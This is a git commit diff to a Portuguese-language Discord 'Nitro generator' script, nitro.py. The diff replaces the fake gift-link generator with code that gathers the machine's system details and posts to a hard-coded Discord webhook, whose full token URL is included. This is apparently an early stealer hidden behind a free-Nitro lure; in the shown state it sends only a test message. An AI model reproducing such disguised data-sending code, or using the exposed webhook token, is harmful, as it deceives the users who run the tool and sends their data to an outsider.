c2ab08a9ae1e137fb9070c10230c63310d3fb695
HI23DC <68709123+HI23DC@users.noreply.github.com>
2020-08-18 03:16:05 -0300

    Update nitro.py

--- Gerador-Nitro/nitro.py
+++ Gerador-Nitro/nitro.py
@@ -1,48 +1,22 @@
-import time
-import random
+import platform
+from dhooks import Webhook
 
-print(" $$$$$$$$$$$$$$$$$$$$$$")
-print("$$$$$$$$$$$$$$$$$$$$$$$$")
-print("$$>|GERADOR DE NITRO|<$$")
-print("$$$$$$$$$$$$$$$$$$$$$$$$")
-print(" $$$$$$$$$$$$$$$$$$$$$$")
-print("                         => Criador: Hi23")
+hook = Webhook("https://discord.com/api/webhooks/745084487431618610/TLADyY3SZfc1DNZReiZOp6YeAaiIURzONkrJ2ApfTr5xuzL1rTwIrc4vq1EcQUW1G75O")
 
+my_system = platform.uname()
 
-i = 0
+system = my_system.system
+node_name =my_system.node
+release = my_system.release
+version = my_system.version
+machine = my_system.machine
+processor = my_system.processor
 
-cod = ["a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "4", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l",
-"L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
+hook.send("teste")
 
-print("Ativacao de nitro quase concluida...")
-time.sleep(2)
-print("Ativacao completa...")
-time.sleep(3)
-
-while i < 500:
-  r1 = random.randrange(0, 62)
-  r2 = random.randrange(0, 62)
-  r3 = random.randrange(0, 62)
-  r4 = random.randrange(0, 62)
-  r5 = random.randrange(0, 62)
-  r6 = random.randrange(0, 62)
-  r7 = random.randrange(0, 62)
-  r8 = random.randrange(0, 62)
-  r9 = random.randrange(0, 62)
-  r10 = random.randrange(0, 62)
-  r11 = random.randrange(0, 62)
-  r12 = random.randrange(0, 62)
-  r13 = random.randrange(0, 62)
-  r14 = random.randrange(0, 62)
-  r15 = random.randrange(0, 62)
-  r16 = random.randrange(0, 62)
-  # r17 = random.randrange(0, 62)
-  # r18 = random.randrange(0, 62)
-  # r19 = random.randrange(0, 62)
-  # r20 = random.randrange(0, 62)
-  # r21 = random.randrange(0, 62)
-  # r22 = random.randrange(0, 62)
-  # r23 = random.randrange(0, 62)
-  #r24 = random.randrange(0, 62)
-  
-  print("https://discord.gift/" + cod[r1] + cod[r2] + cod[r3] + cod[r4] + cod[r5] + cod[r6] + cod[r7] + cod[r8] + cod[r9] + cod[r10] + cod[r11] + cod[r12] + cod[r13] + cod[r14] + cod[r15] + cod[r16])
+print("Sistema: " + system)
+print("Nome do nó: " + node_name)
+print("Liberação: " + release)
+print("Versão: " + version)
+print("Máquina: " + machine)
+print("Processador: " + processor)
